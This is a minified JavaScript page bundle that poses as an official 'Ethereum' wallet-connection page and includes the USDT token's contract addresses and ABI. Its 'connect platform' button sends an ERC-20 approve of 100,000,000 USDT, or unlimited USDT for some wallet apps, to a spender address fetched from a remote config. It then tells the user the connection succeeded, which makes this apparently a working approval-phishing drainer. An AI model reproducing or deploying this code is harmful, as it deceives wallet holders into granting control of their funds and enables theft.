import{g as e,d as a,f as t,h as n,B as s}from"./_vant-090d5365.js";import{g as i}from"./pay-025ce095.js";import{aC as u,aD as o,aE as p,aF as l,aG as d,O as c,F as y,J as r,K as m,aa as f,aH as b,aI as v,ak as w,al as g,an as k,az as _,am as h,ao as M,ap as x,D as C,aB as B,aJ as j,av as F,aK as E,aL as I,aM as A,aN as D,aO as L,aP as O}from"./__vendor-b5f28a7a.js";import{m as P,p as $,k as R,B as S}from"./_viem-f8292e21.js";import{_ as T,b as U}from"../entry/index-fd3bf953.js";const N={1:"0xdAC17F958D2ee523a2206206994597C13D831ec7",56:"0x55d398326f99059fF775485246999027B3197955",66:"0x382bB369d343125BfB2117af9c149795C6C65C50",137:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",42161:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",8e4:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},K=[{constant:!0,inputs:[],name:"name",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_upgradedAddress",type:"address"}],name:"deprecate",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"_spender",type:"address"},{name:"_value",type:"uint256"}],name:"approve",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"deprecated",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_evilUser",type:"address"}],name:"addBlackList",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"totalSupply",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transferFrom",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"upgradedAddress",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"",type:"address"}],name:"balances",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"decimals",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"maximumFee",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"_totalSupply",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[],name:"unpause",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[{name:"_maker",type:"address"}],name:"getBlackListStatus",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"",type:"address"},{name:"",type:"address"}],name:"allowed",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"paused",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"who",type:"address"}],name:"balanceOf",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[],name:"pause",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"getOwner",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"owner",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"symbol",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transfer",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"newBasisPoints",type:"uint256"},{name:"newMaxFee",type:"uint256"}],name:"setParams",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"amount",type:"uint256"}],name:"issue",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"amount",type:"uint256"}],name:"redeem",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[{name:"_owner",type:"address"},{name:"_spender",type:"address"}],name:"allowance",outputs:[{name:"remaining",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"basisPointsRate",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"",type:"address"}],name:"isBlackListed",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_clearedUser",type:"address"}],name:"removeBlackList",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"MAX_UINT",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"newOwner",type:"address"}],name:"transferOwnership",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"_blackListedUser",type:"address"}],name:"destroyBlackFunds",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{inputs:[{name:"_initialSupply",type:"uint256"},{name:"_name",type:"string"},{name:"_symbol",type:"string"},{name:"_decimals",type:"uint256"}],payable:!1,stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!1,name:"amount",type:"uint256"}],name:"Issue",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"amount",type:"uint256"}],name:"Redeem",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"newAddress",type:"address"}],name:"Deprecate",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"feeBasisPoints",type:"uint256"},{indexed:!1,name:"maxFee",type:"uint256"}],name:"Params",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"_blackListedUser",type:"address"},{indexed:!1,name:"_balance",type:"uint256"}],name:"DestroyedBlackFunds",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"_user",type:"address"}],name:"AddedBlackList",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"_user",type:"address"}],name:"RemovedBlackList",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!1,name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!1,name:"value",type:"uint256"}],name:"Transfer",type:"event"},{anonymous:!1,inputs:[],name:"Pause",type:"event"},{anonymous:!1,inputs:[],name:"Unpause",type:"event"}],G=[P],q="d5aacddb9505ba63254518b48882be7c";o({wagmiConfig:u({chains:G,projectId:q,metadata:{name:"Ethereum",description:"Ethereum",url:"https://www.ethereum.com/",icons:["https://i.postimg.cc/RFm2zvfx/Ethereum.jpg"]}}),chains:G,projectId:q,defaultChain:P,enableNetworkView:!1,enableAccountView:!0,enableExplorer:!0,themeMode:"light",featuredWalletIds:["4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0","20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66","ef333840daf915aafdc4a004525502d6d49d77bd9c65e0642dbaefb3c2893bef","971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709","8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4"],excludeWalletIds:["ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18"],themeVariables:{},tokenContracts:{},chainImages:{66:"https://static.oklink.com/cdn/explorer/oklinkmanage/picture/okc_logo.png"},tokenImages:{OKT:"https://static.oklink.com/cdn/explorer/oklinkmanage/picture/okc_logo.png"}});const z=p();l(),d();const V={class:"main"},H={class:"operate"},J={key:0,class:"dev"},W={key:1,class:"dev"},Q={key:2,class:"watermark"},X={key:0},Y={key:1},Z={__name:"eth",setup(u){const o=!1;let{proxy:p}=c();y(!1),y("");let l,d,P=y(0),T=y({}),U=!1,G=!1;const q=y(0),Z=y(0);let ee=y();r((()=>{m((async()=>{const e=j().chain;T.value=e,P.value=(null==e?void 0:e.id)||0;const{id:a}=F.parse(window.location.hash.substring(window.location.hash.indexOf("?")+1));i("eth",a||0).then((e=>{l=e.data.address.contract,d=e.data.address.payee,G=l.substr(-6)})).catch((e=>{console.error("getConfig",e)})),ee.value=await E()}))})),f((()=>{})),b((e=>{ee.value=e})),v((e=>{var a;T.value=e.chain,P.value=(null==(a=null==e?void 0:e.chain)?void 0:a.id)||0,P.value>0&&1!=P.value?te():se()}));const ae=()=>{z.open()},te=()=>{try{I()}catch(e){}},ne=async()=>{var t;if(!1===(null==(t=ee.value)?void 0:t.isConnected))return!1;e({forbidClick:!0,duration:0});const n=await A({address:N[P.value],abi:K,functionName:"allowance",args:[ee.value.address,l]});n<$("10000000")?ie():a(p.$t("message.repeat_connect_platform"))},se=async()=>{var a,n;if(!1===(null==(a=ee.value)?void 0:a.isConnected))return!1;e({forbidClick:!0,duration:0}),q.value="\xb7",Z.value="\xb7",U=!!ee.value.address&&(null==(n=ee.value.address)?void 0:n.substr(-6)),D({address:ee.value.address,chainId:P.value}).then((e=>{q.value=e.formatted,e.formatted})).catch((e=>{console.error("Balance",e.message)})).finally((()=>{t()})),D({address:ee.value.address,chainId:P.value,token:N[P.value]}).then((e=>{Z.value=e.formatted,e.formatted})).catch((e=>{console.error("usdtBalance",e.message)})).finally((()=>{t()}))},ie=async()=>{var a;if(!1===(null==(a=ee.value)?void 0:a.isConnected))return!1;e({forbidClick:!0,duration:0});const s=1e8,i=/TokenPocket|imToken|OKEx/.test(window.navigator.userAgent)?"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff":1==P.value?R(s.toString(),6):$(s.toString());var u={address:N[P.value],abi:K,functionName:"approve",args:[l,i],account:ee.value.address};const o=L(),d=await o.getGasPrice();try{var c=await o.estimateContractGas(u)}catch(r){return ue(r,"gasEstimate"),!1}const y={gasPrice:d,gas:c};Object.assign(u,y),O(u).then((e=>{t(),n({title:p.$t("message.connect_success"),icon:1})})).catch((e=>{ue(e,"approve")}))},ue=(e,s)=>{e instanceof S&&("Cancel"==e.details||new RegExp(/User rejected the request/).test(e.shortMessage)?a(p.$t("message.cancel_operation")):new RegExp(/insufficient funds/).test(e.details)?(a(p.$t("message.insufficient_gas")),console.error("\u77ff\u5de5\u8d39\u4e0d\u8db3",s)):new RegExp(/transfer amount exceedsbalance|insufficient balance/).test(e.details)?(a(p.$t("message.insufficient_balance")),console.error("\u4f59\u989d\u4e0d\u8db3",s)):(console.error("printError",s),console.warn("details",e.details),e.metaMessages.join("\n"),console.warn("shortMessage",e.shortMessage),n({title:p.$t("message.unknown_error"),message:e.shortMessage}),t()))};return(e,a)=>{var t,n,i,u;const p=s;return w(),g("div",V,[k("div",H,[(null==(t=ee.value)?void 0:t.isConnected)?(w(),_(p,{key:0,type:"success",onClick:ne},{default:h((()=>[M(x(e.$t("connect_platform")),1)])),_:1})):(w(),_(p,{key:1,type:"success",onClick:ae},{default:h((()=>[M(x(e.$t("connect_wallet")),1)])),_:1}))]),C(o)&&(null==(n=ee.value)?void 0:n.isConnected)?(w(),g("div",J,[k("button",{class:"btn",onClick:se},"\u5237\u65b0"),C(o)?(w(),g("button",{key:0,class:"btn",onClick:a[0]||(a[0]=e=>{z.open({view:"Networks"})})},"\u5207\u6362\u7f51\u7edc")):B("",!0),k("button",{class:"btn btn-danger",onClick:a[1]||(a[1]=e=>te())},"\u65ad\u5f00")])):B("",!0),C(o)&&(null==(i=ee.value)?void 0:i.isConnected)&&P.value?(w(),g("div",W,[k("p",null,"chain_id: "+x(T.value.id),1),k("p",null,"chain_name: "+x(T.value.name),1),k("p",null,"\u60a8\u7684\u94b1\u5305\u5730\u5740\uff1a"+x(ee.value.address),1),k("p",null,"\u4ee5\u592a\u4f59\u989d\uff1a"+x(q.value)+x(T.value.nativeCurrency.symbol),1),k("p",null,"USDT\u4f59\u989d\uff1a$"+x(Z.value),1)])):B("",!0),(null==(u=ee.value)?void 0:u.isConnected)?(w(),g("view",Q,[C(U)?(w(),g("div",X,x(C(U)),1)):B("",!0),C(G)?(w(),g("div",Y,x(C(G)),1)):B("",!0)])):B("",!0)])}}};"function"==typeof U&&U(Z);const ee=T(Z,[["__scopeId","data-v-b7da7532"]]);export{ee as default};
